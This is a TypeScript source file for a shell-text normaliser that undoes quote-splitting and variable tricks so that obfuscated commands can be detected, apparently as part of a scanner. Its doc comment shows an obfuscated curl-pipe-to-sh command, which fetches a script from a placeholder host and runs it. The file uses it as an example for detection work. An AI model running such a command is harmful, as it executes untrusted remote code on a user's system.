/**
 * Light shell normalisation, so a command assembled from pieces is seen whole:
 *
 *   A="cu""rl -s https://x/b"; B=" | s""h"; eval "$A$B"   →   eval "curl -s https://x/b | sh"
 *
 * Not a shell: no execution, no globbing, no command substitution — only joining adjacent
 * quoted strings and substituting simple `NAME=value` assignments made earlier in the text.
 * Lines are preserved (values never contain newlines), so a match on line N of the result
 * is on line N of the original.
 */

const ASSIGN = /^\s*(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]{0,63})=("(?:[^"\\\n]|\\.){0,400}"|'[^'\n]{0,400}'|[^\s;&|`$()]{1,400})/;

/** `"cu""rl"` → `"curl"`, `'a''b'` → `'ab'` — quotes that only split a word. */
function joinQuotes(line: string): string {
  return line.replace(/(["'])\1/g, '').replace(/"'|'"/g, '');
}

const unquote = (v: string) => (v.startsWith('"') || v.startsWith("'") ? v.slice(1, -1) : v);

/** The normalised text, or null when normalisation changes nothing (the common case). */
export function normalizeShell(text: string): string | null {
  if (!/["']\s*["']|\$\{?[A-Za-z_]/.test(text)) return null;
  const vars = new Map<string, string>();
  let changed = false;
  // Substitution can multiply text ("$A$A$A…" with a 400-char A): stop growing past a fixed budget.
  let budget = 1_000_000;
  const out: string[] = [];
  for (const raw of text.split('\n')) {
    let line = joinQuotes(raw);
    // Substitute known variables first, so `B="$A | sh"` builds on A.
    line = line.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (all, a: string | undefined, b: string | undefined) => {
      const v = vars.get((a ?? b) as string);
      if (v === undefined || budget <= 0) return all;
      budget -= v.length;
      return v;
    });
    if (budget <= 0) return null; // not a script a person wrote by hand
    out.push(line);
    const m = ASSIGN.exec(line);
    if (m) vars.set(m[1] as string, unquote(m[2] as string));
    if (vars.size > 200) vars.clear(); // not a script we can follow
    if (line !== raw) changed = true;
  }
  return changed ? out.join('\n') : null;
}
